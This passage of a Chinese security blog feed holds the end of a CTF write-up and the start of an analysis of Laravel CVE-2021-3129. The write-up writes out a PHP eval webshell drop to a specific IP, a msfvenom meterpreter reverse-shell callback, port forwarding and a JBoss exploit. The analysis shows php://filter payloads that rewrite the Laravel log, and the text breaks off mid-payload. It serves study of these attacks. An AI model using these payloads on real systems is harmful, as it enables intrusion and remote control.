data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1623554064212-f6e071cd-7eab-46a9-9cde-3fea6249cad2.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>查看提示</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1623554253791-d7acb4f4-fd6f-4069-8f5d-3dd3d9f98606.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1623554253791-d7acb4f4-fd6f-4069-8f5d-3dd3d9f98606.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>mysql 限制了文件的读取位置</p><p>这里直接写入webshell不知为何无法写入成功，因此在写入了 system 命令下，把webshell进行编码在写入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://47.104.137.239:36842//upload//1aadcef13858c71dacc8e00b17d0cd10//phpinfo.php?s=echo%20%22PD9waHAgZXZhbChAJF9QT1NUWyJzIl0pOyA%2fPg%3d%3d%22|base64%20-d%20%3E%20s.php</span><br></pre></td></tr></table></figure><p>然后看下端口，一个个试试</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1623569310280-3d2f913e-db1b-4c8a-aaf6-8773c9d3d790.png" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1623569310280-3d2f913e-db1b-4c8a-aaf6-8773c9d3d790.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>在 8006 发现 Jboss，端口转发出来</p><p>为了上传下载文件稳定性，这里用 msf进行（reGeorg 可能环境原因连不上）</p><p>生成马</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x64/meterpreter/reverse_tcp lhost=服务器IP lport=667 -f elf &gt; msf_667</span><br></pre></td></tr></table></figure><p>msfconsole上监听</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handle</span><br><span class="line">set payload linux/x64/meterpreter/reverse_tcp</span><br><span class="line">set lhost 0.0.0.0</span><br><span class="line">set lport 667</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p>把生成的马上传上webshell，然后运行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod +x /tmp/msf_667</span><br><span class="line">/tmp/msf_667</span><br></pre></td></tr></table></figure><p>在反弹回来的meterpreter上进行端口转发</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">portfwd add -l 670 -p 8005 -r 127.0.0.1</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1623590835181-e04b1a08-0ad5-4464-a35d-8a0772cf7596.png" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1623590835181-e04b1a08-0ad5-4464-a35d-8a0772cf7596.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>可正常访问，并且得知为 JBoss 4.0，有个反序列化漏洞。</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1623569330807-e4a0c613-a7b6-430f-99e5-54e516185e32.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1623569330807-e4a0c613-a7b6-430f-99e5-54e516185e32.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>访问如下链接，确实可以利用</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1623569432958-5f7a29e8-64bf-42d8-b33d-a65b9fc89b5e.png" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1623569432958-5f7a29e8-64bf-42d8-b33d-a65b9fc89b5e.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>使用jexboss利用</p><p><a href="https://github.com/joaomatosf/jexboss">https://github.com/joaomatosf/jexboss</a></p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1623571281341-f0db678b-4277-4189-81a6-1f238186bebb.png" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1623571281341-f0db678b-4277-4189-81a6-1f238186bebb.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
          <category> ctf比赛 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> ctf比赛 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Laravel8 CVE-2021-3129 复现分析</title>
      <link href="//p/2021/laravel8-debug-rce/"/>
      <url>//p/2021/laravel8-debug-rce/</url>
      
        <content type="html"><![CDATA[<h2 id="1-前言"><a href="#1-前言" class="headerlink" title="1. 前言"></a>1. 前言</h2><p>由于参加两次CTF都遇上了<code>反序列化+PHP各种filter过滤器的利用</code>，然后对一些不常见<code>filter</code>的利用不是很熟悉，因此复现分析一下 <code>CVE-2021-3129</code>，因为这个CVE对一些<code>filter</code>利用的比较巧妙</p><p><a href="https://github.com/facade/ignition">ignition组件</a>是Laravel5.5及其之后的使用的自定义错误页面美化组件，2.5.2 版本之前因 <code>file_get_contents()</code> 和 <code>file_put_contents()</code>两个函数不安全使用导致攻击者可以在Laravel框架（&lt;8.4.2）开启debug模式的情况下未授权RCE。</p><p>影响范围<sup>[1-2]</sup></p><ul><li>ignition</li></ul><p>&gt;= 2.5.0, &lt; 2.5.2</p><p>&gt;= 2.0.0, &lt; 2.4.2</p><p>&gt;= 1.7.0, &lt; 1.16.14</p><p>&lt; 1.6.15</p><ul><li>Laravel </li></ul><p>&lt; 8.4.2</p><h2 id="2-环境搭建"><a href="#2-环境搭建" class="headerlink" title="2. 环境搭建"></a>2. 环境搭建</h2><p>复现环境：PHP 7.3.24</p><h3 id="2-1-安装-composer"><a href="#2-1-安装-composer" class="headerlink" title="2.1 安装 composer"></a>2.1 安装 composer</h3><p><a href="https://getcomposer.org/download/">https://getcomposer.org/download/</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">php -r <span class="string">&quot;copy(&#x27;https://getcomposer.org/installer&#x27;, &#x27;composer-setup.php&#x27;);&quot;</span></span><br><span class="line">php -r <span class="string">&quot;if (hash_file(&#x27;sha384&#x27;, &#x27;composer-setup.php&#x27;) === &#x27;756890a4488ce9024fc62c56153228907f1545c228516cbf63f885e036d37e9a59d27d63f46af1d4d07ee0f76181c7d3&#x27;) &#123; echo &#x27;Installer verified&#x27;; &#125; else &#123; echo &#x27;Installer corrupt&#x27;; unlink(&#x27;composer-setup.php&#x27;); &#125; echo PHP_EOL;&quot;</span></span><br><span class="line">php composer-setup.php</span><br><span class="line">php -r <span class="string">&quot;unlink(&#x27;composer-setup.php&#x27;);&quot;</span></span><br><span class="line"></span><br><span class="line">sudo mv composer.phar /usr/<span class="built_in">local</span>/bin/composer</span><br></pre></td></tr></table></figure><h3 id="2-2-安装-Laravel"><a href="#2-2-安装-Laravel" class="headerlink" title="2.2 安装 Laravel"></a>2.2 安装 Laravel</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/laravel/laravel.git</span><br><span class="line"><span class="built_in">cd</span> laravel</span><br><span class="line">git checkout -b e849812</span><br><span class="line">composer install</span><br><span class="line">composer require facade/ignition==2.5.1</span><br><span class="line">cp .env.example .env</span><br><span class="line">php artisan key:generate</span><br></pre></td></tr></table></figure><p><code>.env.example</code> 默认配置是<code>debug</code>模式，可不予理会</p><p>然后启动 Apache 环境即可，访问</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://xxxx/public/index.php</span><br></pre></td></tr></table></figure><p>这里不用 <code>php artisan serve</code> 启动因为没有Apache集成环境debug方便</p><p><img src="/img/laravel8-debug-rce/image-20210603153123337.png" class="lazyload" data-srcset="/img/laravel8-debug-rce/image-20210603153123337.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210603153123337"></p><h3 id="2-3-编写漏洞入口代码"><a href="#2-3-编写漏洞入口代码" class="headerlink" title="2.3 编写漏洞入口代码"></a>2.3 编写漏洞入口代码</h3><p>先在 <code>resources/views</code> 目录下新建一个文件 <code>hello.blade.php</code>，内容为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;h1&gt; Hello &#123;&#123; $username &#125;&#125; &lt;/h1&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p><code>routes/web.php</code> 增加路由</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Route::get(<span class="string">&#x27;/hello&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> view(<span class="string">&#x27;hello&#x27;</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p><img src="/img/laravel8-debug-rce/image-20210603153756640.png" class="lazyload" data-srcset="/img/laravel8-debug-rce/image-20210603153756640.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210603153756640"></p><p>访问这个视图</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://laravel8.tari:8890/public/index.php/hello</span><br></pre></td></tr></table></figure><p>正常出现变量未定义报错信息</p><p><img src="/img/laravel8-debug-rce/image-20210603153845580.png" class="lazyload" data-srcset="/img/laravel8-debug-rce/image-20210603153845580.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210603153845580"></p><h2 id="3-漏洞分析"><a href="#3-漏洞分析" class="headerlink" title="3. 漏洞分析"></a>3. 漏洞分析</h2><h3 id="3-1-触发点路由追踪"><a href="#3-1-触发点路由追踪" class="headerlink" title="3.1 触发点路由追踪"></a>3.1 触发点路由追踪</h3><p>点击 <code>Make variable optional</code> 并抓包，这个方法会自动把我们模板的 <code>&#123;&#123; $username &#125;&#125;</code> 替换为 <code>&#123;&#123; $username ?? '' &#125;&#125;</code>，即添加一个默认值</p><p><img src="/img/laravel8-debug-rce/image-20210603155331535.png" class="lazyload" data-srcset="/img/laravel8-debug-rce/image-20210603155331535.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210603155331535"></p><p>可以看到，请求的路径为 <code>_ignition/execute-solution</code></p><p><img src="/img/laravel8-debug-rce/image-20210603155451064.png" class="lazyload" data-srcset="/img/laravel8-debug-rce/image-20210603155451064.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210603155451064"></p><p>全局分别搜一下 <code>_ignition</code> 和 <code>execute-solution</code> 可知</p><p>本API对应的方法为 <code>vendor/facade/ignition/src/IgnitionServiceProvider.php</code> 中的 <code>ExecuteSolutionController</code> 类</p><p><img src="/img/laravel8-debug-rce/image-20210603213316826.png" class="lazyload" data-srcset="/img/laravel8-debug-rce/image-20210603213316826.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210603213316826"></p><p>跟进此类，下个断点发现<code>ExecuteSolutionController</code>类对象会被当做函数调用</p><p><img src="/img/laravel8-debug-rce/image-20210603222122634.png" class="lazyload" data-srcset="/img/laravel8-debug-rce/image-20210603222122634.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210603222122634"></p><p>与其定义的 <code>__invoke</code> 魔术方法一致。</p><p>在<code>__invoke</code> 魔术方法中先调用</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$solution</span> = <span class="variable">$request</span>-&gt;getRunnableSolution();</span><br></pre></td></tr></table></figure><p>获取 <code>$solution</code> 对象随后调用 <code>$solution</code>对象的 <code>run</code>方法</p><p>跟进得知 <code>$solution</code> 即为我们 POST 传入的</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;solution&quot;</span>:<span class="string">&quot;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&quot;</span></span><br></pre></td></tr></table></figure><p>跟进 <code>$solution-&gt;run();</code></p><p><img src="/img/laravel8-debug-rce/image-20210604140216816.png" class="lazyload" data-srcset="/img/laravel8-debug-rce/image-20210604140216816.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210604140216816"></p><p>逻辑可简化为</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$originalContents</span> = file_get_contents(<span class="variable">$parameters</span>[<span class="string">&#x27;viewFile&#x27;</span>]);</span><br><span class="line">file_put_contents(<span class="variable">$parameters</span>[<span class="string">&#x27;viewFile&#x27;</span>], <span class="variable">$output</span>);</span><br></pre></td></tr></table></figure><p>其中 <code>$parameters</code> 为我们 POST 传入的</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;parameters&quot;</span>:&#123;<span class="attr">&quot;variableName&quot;</span>:<span class="string">&quot;username&quot;</span>,<span class="attr">&quot;viewFile&quot;</span>:<span class="string">&quot;/Users/tari/Sites/laravel/resources/views/hello.blade.php&quot;</span>&#125;</span><br></pre></td></tr></table></figure><p>之所以可以简化为两行，是因为中间的逻辑主要为，在 <code>$this-&gt;makeOptional($parameters);</code>方法里把 <code>$parameters[&#39;variableName&#39;]</code>加上 <code>&quot;?? &#39;&#39;&quot;</code> ，之后为从词法分析层面，即 <code>$this-&gt;generateExpectedTokens()</code> 中，是否真的在变量 <code>$parameters[&#39;variableName&#39;]</code> 期望位置加上了 <code>&quot;?? &#39;&#39;&quot;</code></p><p>，加上了的话就返回替换后的内容。所以只要我们传入的 <code>$parameters[&#39;variableName&#39;]</code> 变量在模板文件中真实存在，多为满足条件的。<strong>当然这是建立在我们只到变量名称的情况下，如果不知道呢？</strong></p><p>换个角度理解，只要我们传入的变量是模板中不存在的，那么 <code>$newTokens</code> 恒为 <code>[0]</code>，<code>$expectedTokens</code> 也是恒为 <code>[0]</code>，那么 <code>$expectedTokens !== $newTokens</code> 恒成立，压根就不用管这部分逻辑。</p><h3 id="3-2-漏洞点分析"><a href="#3-2-漏洞点分析" class="headerlink" title="3.2 漏洞点分析"></a>3.2 漏洞点分析</h3><p> <code>file_get_contents</code> 和 <code>file_put_contents</code> 读取和写入的文件是一样的，且文件输出内容几乎不可控，相当于读取一个文件，又写回去，就加上了 <code>&quot;?? &#39;&#39;&quot;</code> 。</p><p>虽然 <code>$parameters[&#39;variableName&#39;]</code>  不太可控，但 <code>file_get_contents</code> 和 <code>file_put_contents</code> 的输入，即<code>$parameters[&#39;viewFile&#39;]</code> 是可控的。然后服务端上我们可控的文件只有日志文件，这里使用 Laravel 的日志文件，默认位置是 <code>storage/logs/laravel.log</code> ，是用来记录一些 ERROR 级别的报错日志。</p><p><img src="/img/laravel8-debug-rce/image-20210604192821592.png" class="lazyload" data-srcset="/img/laravel8-debug-rce/image-20210604192821592.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210604192821592"></p><p>格式可分为 4 部分，时间、错误、错误描述、错误堆栈</p><p>先尝试一下输入的内容是否能正常的写入日志文件中</p><p><img src="/img/laravel8-debug-rce/image-20210606161844233.png" class="lazyload" data-srcset="/img/laravel8-debug-rce/image-20210606161844233.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210606161844233"></p><p><img src="/img/laravel8-debug-rce/image-20210606162114729.png" class="lazyload" data-srcset="/img/laravel8-debug-rce/image-20210606162114729.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210606162114729"></p><p>可以正常写入，也就是，日志文件大概如下结构，其中payload为我们可控部分</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[prefix]PAYLOAD[midfix1]PAYLOAD[midfix2]部分PAYLOAD[suffix]</span><br></pre></td></tr></table></figure><p>问题在于，如何在存在<code>[prefix]</code> <code>[midfix1]</code> <code>[midfix2]</code> <code>[suffix]</code> 的情况下，如何让可控<code>PAYLOAD</code>被利用？</p><p>首先，考虑 <code>phar://</code>数据流包装器，因为 <code>file_get_contents</code> 会触发 phar 的反序列化，通过 viewFile 传入即可。但这里会遇到几个问题</p><h3 id="3-3-尝试-base64-过滤器修改内容"><a href="#3-3-尝试-base64-过滤器修改内容" class="headerlink" title="3.3 尝试 base64 过滤器修改内容"></a>3.3 尝试 base64 过滤器修改内容</h3><p>PHP 中 <code>base64</code> 解码会过滤除特殊字符，如</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> base64_decode(<span class="string">&#x27;[;#MQ==#...&lt;&lt;&gt;&#x27;</span>);</span><br></pre></td></tr></table></figure><p><img src="/img/laravel8-debug-rce/image-20210605104826605.png" class="lazyload" data-srcset="/img/laravel8-debug-rce/image-20210605104826605.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210605104826605"></p><p><code>&#39;1&#39;</code> 等价于 <code>base64_decode(&#39;MQ==&#39;)</code> 等价于 <code>base64_decode(&#39;[;#MQ==#...&lt;&lt;&gt;&#39;)</code></p><p>然后PHP的<code>base64_decode</code>解码还有一个特性，在需要解码的字符串长度不足4的倍数时，会自动添加 <code>=</code> 号填充，也就是说，没有因输入的字符串不符合base64编码后的规则而抛出异常一说，直至把字符串解码为空串</p><p><img src="/img/laravel8-debug-rce/image-20210605144342722.png" class="lazyload" data-srcset="/img/laravel8-debug-rce/image-20210605144342722.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210605144342722"></p><p>但问题在于，这个值难以控制，如日志里的时间</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">php &gt; var_dump(base64_decode(base64_decode(<span class="string">&#x27;[2021-06-05 05:21:45]&#x27;</span>)));</span><br><span class="line"><span class="keyword">string</span>(<span class="number">1</span>) <span class="string">&quot;3&quot;</span></span><br><span class="line">php &gt; var_dump(base64_decode(base64_decode(<span class="string">&#x27;[2021-06-06 05:21:45]&#x27;</span>)));</span><br><span class="line"><span class="keyword">string</span>(<span class="number">0</span>) <span class="string">&quot;&quot;</span></span><br></pre></td></tr></table></figure><p>稍微把5变为6，结果则不尽相同。此外，后面还有调用栈等复杂的字符串，处理起来比较麻烦。</p><p>不过PHP base64特性也不是一无是处，我们可以利用它清空<code>laravel.log</code>使我们受到的干扰进一步降低。经实验，258278字符的日志文件在经过 8次 <code>base64_decode</code>后即可变为空。即多请求几次这个接口即可清空日志文件。</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;solution&quot;</span>:<span class="string">&quot;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&quot;</span>,<span class="attr">&quot;parameters&quot;</span>:&#123;<span class="attr">&quot;variableName&quot;</span>:<span class="string">&quot;suiyi&quot;</span>,<span class="attr">&quot;viewFile&quot;</span>:<span class="string">&quot;php://filter/write=convert.base64-decode/resource=../storage/logs/laravel.log&quot;</span>&#125;&#125;</span><br></pre></td></tr></table></figure><p>理想中是美好的，但意外却发生了</p><p><img src="/img/laravel8-debug-rce/image-20210605165008739.png" class="lazyload" data-srcset="/img/laravel8-debug-rce/image-20210605165008739.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210605165008739"></p><p>上图中报错，是因为日志文件中含有 <code>=</code> 号，但等号在 base64编码中是结束用的填充符号，会使得PHP base64解码过滤器抛出异常<sup>[5]</sup>。</p><p>原来，filter过滤器中的base64解码和直接用 <code>base64_decode</code>是不同的。3.3小节开头中用<code>base64_decode</code>函数字符串中含有 <code>=</code> 号是能正常解码的。</p><p>但假设不存在 <code>=</code> 号，清空文件是无问题的哈</p><p><img src="/img/laravel8-debug-rce/image-20210605151747374.png" class="lazyload" data-srcset="/img/laravel8-debug-rce/image-20210605151747374.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210605151747374"></p><p>或者一步到位，结合多个base64解码过滤器</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;solution&quot;</span>:<span class="string">&quot;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&quot;</span>,<span class="attr">&quot;parameters&quot;</span>:&#123;<span class="attr">&quot;variableName&quot;</span>:<span class="string">&quot;suiyi&quot;</span>,<span class="attr">&quot;viewFile&quot;</span>:<span 